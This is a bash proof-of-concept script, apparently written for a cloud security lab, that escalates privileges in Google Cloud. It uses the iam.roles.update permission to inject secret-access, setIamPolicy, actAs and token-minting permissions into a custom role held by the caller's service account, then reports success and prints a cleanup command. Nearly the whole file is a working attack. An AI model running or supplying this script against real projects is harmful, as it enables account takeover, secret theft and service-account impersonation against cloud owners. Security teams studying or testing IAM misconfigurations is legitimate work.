#!/bin/bash
# iam-role-escalation-poc.sh
# Simple PoC to abuse iam.roles.update on a custom role
# Injects desired permissions into the role (additive only)
# Usage: ./iam-role-escalation-poc.sh <custom-role-id>
# Example: ./iam-role-escalation-poc.sh nameofroletoimpersonate

set -euo pipefail

ROLE_ID="${1:-}"

if [[ -z "$ROLE_ID" ]]; then
    echo "Usage: $0 <custom-role-id>"
    echo "Example: $0 customRoleIamLab5_uqjheg"
    exit 1
fi

PROJECT_ID=$(gcloud config get-value project 2>/dev/null)
if [[ -z "$PROJECT_ID" ]]; then
    echo "No project set in gcloud config."
    echo "Run: gcloud config set project YOUR-PROJECT-ID"
    exit 1
fi

CURRENT_SA=$(gcloud auth list --filter=status:ACTIVE --format="value(account)")
echo "Active SA   : $CURRENT_SA"
echo "Project     : $PROJECT_ID"
echo "Target role : $ROLE_ID"
echo ""

# Edit this line with the permissions you want to inject (comma-separated)
ESCALATION_PERMS="secretmanager.versions.access,resourcemanager.projects.setIamPolicy,iam.serviceAccounts.actAs,iam.serviceAccounts.getAccessToken,iam.serviceAccounts.implicitDelegation"

echo "[*] Step 1: Current role state (before update)"
gcloud iam roles describe "$ROLE_ID" --project="$PROJECT_ID" || {
    echo "  Failed — role may not exist or missing iam.roles.get"
    exit 1
}
echo ""

echo "[*] Step 2: Attempting to add permissions:"
echo "    $ESCALATION_PERMS"
echo ""

gcloud iam roles update "$ROLE_ID" \
    --project="$PROJECT_ID" \
    --add-permissions="$ESCALATION_PERMS"

if [ $? -eq 0 ]; then
    echo ""
    echo "[+] UPDATE SUCCEEDED — you control this role"
    echo "    Your SA now has the new permissions instantly"
    echo ""
    echo "[*] Step 3: Updated role state"
    gcloud iam roles describe "$ROLE_ID" --project="$PROJECT_ID" | grep -A 50 includedPermissions
else
    echo ""
    echo "[-] UPDATE FAILED"
    echo "    Likely missing iam.roles.update on this specific role"
    echo "    Or role is immutable (stage=GA)"
fi

echo ""
echo "Done."
echo "Manual cleanup (if desired):"
echo "gcloud iam roles update \"$ROLE_ID\" --project=\"$PROJECT_ID\" --remove-permissions=\"$ESCALATION_PERMS\""
